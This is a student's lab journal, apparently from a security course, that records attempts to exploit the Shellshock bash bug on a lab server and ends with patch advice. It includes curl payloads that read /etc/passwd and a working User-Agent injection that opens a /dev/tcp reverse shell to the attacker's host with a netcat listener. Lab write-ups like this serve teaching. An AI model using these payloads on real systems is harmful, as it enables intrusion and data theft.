11/01

Shellshock is the name of a vulnerabilty in computer systems that has been around for about 3 decades now. 
The vulnerability was discovered by StÃ©phane Chazelas, on September 12, 2014 where Chazelas found a bug in 
the Bash command line shell, and was given the CVE of CVE-2014-6271. A fix/patch was implemented through an 
update 10 days later on September 24, 2014. By exploiting shellshock, an attacker is able to escalate their 
own priviledges in the system that they otherwise would not have. This allows the attacker to then do what 
they desire with the system. The vulnerability is exploited by attackers today relatively quite often because 
of the simplicity of the attack, low cost, and small amount of knowledge needed in comparison to other 
vulnerabilities. The common weakness found from the Common Weakness Enumeration for vulnerabilities such as 
shellshock is the unintentional allowance for attackers to execute unintended, malicious commands, they 
should not have access to, directly on the operating system. The system is yet at more risk if it does not
follow the principle of least privilege, meaning the system will then not prevent the attacker from obtaining 
the privileges that allow for them to inflict yet more damage with commands they wouldn't have had access 
to if the principle was in effect in the system. 

11/02

I have spent about 3 and a half hours trying to exploit the shell shock vulnerability now and I am stuck. I have attempted numerous command such as: 

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" "http://10.121.21.101/cgi-bin/test.cgi"

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" "http://10.121.21.101/cgi-bin/test.cgi"

curl -H 'User-Agent: () { :; }; echo vulnerable' bash -c "echo test" 

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.121.21.101/

ssh -i kali 10.121.21.101 -t '() { :; }; id'

ssh 10.121.21.101 '() { :; }; id'  

and more...

Today I slacked Dr. Stanley and he helped me by asking me the right questions I needed to answer to 
understand what my command attack was doing. I learned that the bash bug is specifically in how bash
interprets the following: () { :; }; By having bash interpret this empty function, it gets confused
and lets you inject a payload of your own after it. This makes Jim vulnerable to a shellshock attack. 
I also learned that the User-Agent variable gets passed to bash by the web server. This is important 
because the attacker controls what the User-Agent variable is because it comes to the web server as 
a request. Unfortunately, 10.121.21.101 (Jim) does not pass the User-Agent variable to bash. So I 
am going to look for another way for the server to pass, maybe another variable, to bash. 



question to go off of for tomorrow: if the user agent variable isnt passed to bash by the web server, what variable/header is? 


11/03

Today for about the first hour of analysis, I attempted to use all the different request headers with 
curl as attack vectors to gain a reverse shell. None of these worked. I spent more time researching 
how I could potentially force the web server to pass the request headers to bash. This went nowhere. 
I asked Dr. Stanley for help again and he told me to revist the stackexchange site I found yesterday. 
In doing this I realized I need to access a cgi script on Jim in order for my User Agent header 
variable to get executed and become an environment variable. This is a way I can enable my attack to 
succeed. Now I have been searching for any cgi file that could be on Jim using Dirbuster...this is
tedious. I have brute forced searched for files ending with .cgi and with no extension in this
directoy: 10.121.21.101/cgi-bin/ with no luck. I am calling it quits for today. One last thing I
did today was I found this video: https://www.youtube.com/watch?v=EdQXCbyW5gs, which explained to
me that I could use nmap to find some hidden directories and files on the server. I ran a command 
and found that I could access a info.php file which had some interesting info.


11/04

Today I began by continuing to search for files in the cgi-bin. Dr. Stanley gave me a helpful hint 
that made me realizing I could actually log in to the server. It was there that I found the cgi-bin 
directory at /usr/lib/cgi-bin. I then struggled a while longer with getting the attack to work with 
some files in the cgi-bin because I had not yet realized that it needed to be a specific file that 
the web server could properly load. I tested each file in the folder one by one by loading it in 
the browser such as 10.121.21.101/cgi-bin/aFile.txt...it was not until I tried 
10.121.21.101/cgi-bin/sw.sh where it loaded the file and the text that was displayed on the web
page was even "Shell Shock Attack." I knew I had gotten it! I then ran the command, with all the 
information I had gathered on how to exploit the vulnerability properly, accordingly:


BEGIN EXPLOIT

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.121.103.2/9000 0<&1' 10.121.21.101/cgi-bin/sw.sh

along with a listener listening in another terminal using the command nc -l 9000...and the reverse shell attack worked! I was so happy.

After performing the exploit, I put a file on the server named you_have_been_infected_by_the_Flash.txt so that the owner's of the web server know I got the best of them. 

END EXPLOIT


Jim is made vulnerable to this attack because the server is running a version of bash between 
version 1.03 and 4.3. An administrator of the server can run a manual pentest easily this by 
running the command: 

env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 

This command will echo back the word "vulnerable" as well as "this is a test" if the server 
is vulnerable to shellshock, which the server does. The version Jim is running is 4.2.37. 
A patch for Jim to implement, to prevent this attack from happening again, is to update its 
version of bash to any version after 4.3 (preferably the latest release). The patch that
came out to fix this vulnerablity prevents bash from interpreting anything else but the 
function definition. By doing this, no arbitrary code can be executed after the function 
definition by an attacker. 


Last modified and updated: 11/08

Sources used in analysis:

https://security.stackexchange.com/questions/68216/how-are-you-able-to-inject-bash-script-through-the-user-agent

https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/

https://dwheeler.com/essays/shellshock.html

https://www.youtube.com/watch?v=aCj-Khvg5n0

https://www.sevenlayers.com/index.php/125-exploiting-shellshock

https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability

https://unix.stackexchange.com/questions/157381/when-was-the-shellshock-cve-2014-6271-7169-bug-introduced-and-what-is-the-pat

https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug

https://security.stackexchange.com/questions/68216/how-are-you-able-to-inject-bash-script-through-the-user-agent